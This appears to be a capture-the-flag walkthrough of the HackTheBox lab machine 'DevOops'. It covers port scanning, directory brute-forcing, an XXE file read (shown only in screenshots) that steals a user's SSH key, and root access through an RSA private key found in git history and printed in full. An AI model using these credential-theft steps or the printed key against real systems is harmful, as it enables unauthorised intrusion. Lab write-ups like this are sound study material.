nmap scan

```
sudo nmap -p- --min-rate 10000 -oA nmap 10.10.10.91
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
```

### Enumerating port 5000

![image1](/assets/images/htb-devoops/devoops1.png)

Using gobuster we find this:

```
sudo gobuster -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://devoops.htb:5000/ -t 50
/upload (Status: 200)
/feed (Status: 200)
```

`/feed` is the image, and `/upload` is this:

![image2](/assets/images/htb-devoops/devoops2.png)

We can upload XML files with the Author, Subject, Content elements let's create file with this elements and upload it:

![image3](/assets/images/htb-devoops/devoops3.png)

I get a `500` Internal Server Error, knowing it's a blog and it has its feed I'll add the `entry` tags:

![image4](/assets/images/htb-devoops/devoops4.png)

### Exploiting XXE to get ssh key

Now I'll try XXE:

![image5](/assets/images/htb-devoops/devoops5.png)

It's vulnerable to xxe, so we can read files on the machine, we know that the user `roosa` has a home directory, so I'll try to read the id_rsa key if this user has:

![image6](/assets/images/htb-devoops/devoops6.png)

This user has now we can login with this key:

```
ssh -i roosa-key roosa@10.10.10.91
```

### Privilege Escalation

Viewing the content of the `.bash_history`, this user is adding content with git:

```
---
---
git status             
git add feed.py
cat ../run-gunicorn.sh 
git add ../run-gunicorn.sh 
git commit -m 'Set PIN to make debugging faster as it will no longer change every time the application code is changed. Remember to remove before production use.'                            
git push           
git log    
---
---
```

Now this `run-gunicorn` is at `~/work/blogfeed` I'll go here and check the git history:

```
git log --name-only --oneline
7ff507d Use Base64 for pickle feed loading
src/feed.py
src/index.html
26ae6c8 Set PIN to make debugging faster as it will no longer change every time the application code is changed. Remember to remove before production use.
run-gunicorn.sh
src/feed.py
cec54d8 Debug support added to make development more agile.
run-gunicorn.sh
src/feed.py
ca3e768 Blogfeed app, initial version.
src/feed.py
src/index.html
src/upload.html
dfebfdf Gunicorn startup script
run-gunicorn.sh
33e87c3 reverted accidental commit with proper key
resources/integration/authcredentials.key
d387abf add key for feed integration from tnerprise backend
resources/integration/authcredentials.key
1422e5a Initial commit
README.md
```

This user accidentaly added a key, I'll check the two commits:

```
git diff 1422e5a d387abf
diff --git a/resources/integration/authcredentials.key b/resources/integration/authcredentials.key
new file mode 100644
index 0000000..44c981f
--- /dev/null
+++ b/resources/integration/authcredentials.key
@@ -0,0 +1,28 @@
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
+8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
+vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
+nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
+CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
+F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
+uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
+gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
+k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
+NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM
+HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
+2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB
+GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
+jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
+IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw
++XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
+7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
+Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
+iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
+VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
+S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6
+md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
+LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz
+oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
+LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=
+-----END RSA PRIVATE KEY-----
+
```

This key is different from roosa's one, so I'll try to use it for root:

```
ssh -i root-key root@10.10.10.91
root@gitter:~# whoami
root
```

And we are root
